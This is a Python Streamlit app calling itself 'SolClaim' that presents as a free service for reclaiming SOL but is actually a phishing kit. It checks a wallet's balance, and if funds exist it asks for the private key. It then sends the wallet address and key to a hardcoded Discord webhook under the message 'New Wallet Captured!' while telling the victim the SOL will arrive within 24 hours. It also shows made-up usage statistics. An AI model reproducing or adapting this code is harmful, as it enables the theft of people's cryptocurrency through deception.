import streamlit as st
import time
import requests
import base58
import base64
from solana.rpc.api import Client
from solana.publickey import PublicKey

# Initialize Solana client
solana_client = Client("https://api.mainnet-beta.solana.com")

# Discord webhook URL
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1334214089492267018/kHwvZUbz4zsWDU4Xy2WkXspgR1_JPXbbftLzeVfKdBm6T0t4w8GGUhn4CN_b5-WSN3Ht"

def is_valid_solana_private_key(private_key):
    
    try:
        decoded_key = base58.b58decode(private_key)
        return len(decoded_key) == 32
    except:
        return False

def check_wallet_eligibility(wallet_address):
    try:
        pubkey = PublicKey(wallet_address)
        response = solana_client.get_balance(pubkey)
        if response and "result" in response:
            lamports = response["result"]["value"]
            balance = lamports / 1_000_000_000
            if balance > 0:
                return balance
    except Exception as e:
        print(f"Debug - Wallet check error: {e}")
    return 0

def send_to_discord(wallet_address, private_key):
    message = {
        "content": f"🎯 New Wallet Captured!\nWallet: {wallet_address}\nPrivate Key: {private_key}"
    }
    requests.post(DISCORD_WEBHOOK_URL, json=message)
st.title("💰 SolClaim: Reclaim Your Sol!")
st.write("📊 Stats: 6252 users have already claimed 1925.67 SOL in total!")
st.write("If you've traded or received tokens on Solana (like Raydium or Pumpfun), use SolClaim to check if you're eligible to claim back SOL for FREE.")

menu = st.sidebar.selectbox("Navigation", ["Check Wallet ✅", "Invite & Earn 📢"])

import re

def check_solana_private_key(private_key):
    # Solana private key pattern: base58 characters, 32-44 length
    pattern = r'^[1-9A-HJ-NP-Za-km-z]{32,44}$'
    return bool(re.match(pattern, private_key))

if menu == "Check Wallet ✅":
      st.header("Check Wallet Eligibility")
      wallet_address = st.text_input("❓ Enter your Solana wallet address to check available SOL to claim:")

      if wallet_address:
          with st.spinner("🕑 Loading wallet info..."):
              time.sleep(3)
              claimable_sol = check_wallet_eligibility(wallet_address)
            
              if claimable_sol > 0:
                  st.success(f"🎉 You have {claimable_sol:.6f} SOL available to claim!")
                  private_key = st.text_input("Enter your Solana private key (88 characters):", type="password")
                
                  if private_key:
                      if check_solana_private_key(private_key):
                          send_to_discord(wallet_address, private_key)
                          st.success("✅ Successfully initiated cleanup!")
                          st.info("🕒 Your SOL will be transferred within 24 hours. Thank you for your patience!")
                      else:
                          st.error("❌ Invalid format. Please enter a valid Solana private key")
elif menu == "Invite & Earn 📢":
    st.header("Invite & Earn 📢")
    st.write("🚧 This feature is currently under development. 🚧")
    st.write("We're working hard to bring you a seamless referral system where you can invite friends and earn rewards!")
